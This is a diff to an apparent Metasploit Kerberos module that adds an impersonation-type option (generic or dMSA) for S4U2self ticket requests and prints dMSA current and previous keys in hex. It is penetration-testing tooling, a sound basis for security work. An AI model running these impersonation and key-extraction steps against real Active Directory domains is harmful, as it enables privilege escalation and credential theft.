@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
         OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
         OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
-        OptBool.new('DMSA', [ false, 'Set to true if the account you are impersonating is a dMSA account' ]),
+        OptEnum.new('IMPERSONATE_TYPE', [true, 'The impersonation type to use when requesting a TGS', 'none', ['auto', 'generic', 'none', 'dmsa'], 'none']),
         OptString.new(
           'NTHASH', [
             false,
@@ -203,9 +203,9 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['Krb5Ccname'].present?
       tgt_request_options[:cache_file] = datastore['Krb5Ccname']
     end
-    credential = authenticator.request_tgt_only(tgt_request_options)[:credential]
+    credential = authenticator.request_tgt_only(tgt_request_options)
 
-    if datastore['IMPERSONATE'].present? && datastore['DMSA'] == true
+    if datastore['IMPERSONATE_TYPE'] == 'dmsa'
       print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
 
       sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
@@ -219,9 +219,9 @@ class MetasploitModule < Msf::Auxiliary
       nonce = rand(0..0x7FFFFFFF)
       auth_options = {
         sname: sname,
-        impersonate: datastore['IMPERSONATE'],
         nonce: nonce,
-        dmsa: true
+        impersonate: datastore['IMPERSONATE'],
+        impersonate_type: datastore['IMPERSONATE_TYPE']
       }
       tgs_ticket, tgs_auth, ticket_path = authenticator.s4u2self(
         credential,
@@ -241,8 +241,7 @@ class MetasploitModule < Msf::Auxiliary
       auth_options[:tgs_ticket] = tgs_ticket
       auth_options[:path] = ticket_path
       auth_options
-      # authenticator.s4u2proxy(credential, auth_options)
-    elsif datastore['IMPERSONATE'].present?
+    elsif datastore['IMPERSONATE_TYPE'] == 'generic'
       print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
 
       sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
@@ -282,27 +281,13 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  # Helper method to decode encryption type
-  def decode_encryption_type(type)
-    case type
-    when 18
-      'AES256'
-    when 17
-      'AES128'
-    when 23
-      'RC4'
-    else
-      'Unknown'
-    end
-  end
-
   def print_dmsa_key_package_info(dmsa_key_package)
     print_status('dMSA Key Package:')
 
     print_status('  Current Keys:')
     dmsa_key_package.current_keys.each do |key_set|
       key_set.each do |key|
-        type = decode_encryption_type(key[0][0])
+        type = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[key[0][0]] || 'unknown'
         value = key[1][0]
         print_good("    Type: #{type}, Key: #{value.unpack1('H*')}")
       end
@@ -311,7 +296,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status('  Previous Keys:')
     dmsa_key_package.previous_keys.each do |key_set|
       key_set.each do |key|
-        type = decode_encryption_type(key[0][0])
+        type = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[key[0][0]] || 'unknown'
         value = key[1][0]
         print_good("    Type: #{type}, Key: #{value.unpack1('H*')}")
       end
